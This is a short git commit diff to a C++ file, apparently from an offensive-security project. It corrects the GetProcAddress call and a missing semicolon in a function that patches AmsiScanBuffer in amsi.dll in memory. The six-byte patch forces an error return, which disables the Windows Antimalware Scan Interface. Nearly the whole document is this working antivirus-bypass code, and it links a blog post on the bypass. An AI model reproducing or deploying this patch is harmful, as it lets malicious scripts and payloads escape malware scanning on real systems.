463b4c5ba39c6121842b197e98412411faa9eff1
plackyhacker <42491100+plackyhacker@users.noreply.github.com>
2021-04-06 21:14:17 +0100

    Update amsi.cpp

--- amsi.cpp
+++ amsi.cpp
@@ -25,12 +25,12 @@ BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {
 void PatchAmsiScanBuffer()
 {	
 	HMODULE amsiDllHandle = ::LoadLibraryW(L"amsi.dll");
-	FARPROC addr = ::GetProcAddressW(amsiDllHandle, L"AmsiScanBuffer");
+	FARPROC addr = ::GetProcAddress(amsiDllHandle, "AmsiScanBuffer");
 	
 	// https://rastamouse.me/blog/asb-bypass-pt3/
 	char patch[6] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
 	
 	HANDLE processHandle = ::GetCurrentProcess();
 	
-	::WriteProcessMemory(processHandle, addr, (PVOID)patch, (SIZE_T)6, (SIZE_T *)nullptr)
+	::WriteProcessMemory(processHandle, addr, (PVOID)patch, (SIZE_T)6, (SIZE_T *)nullptr);
 }
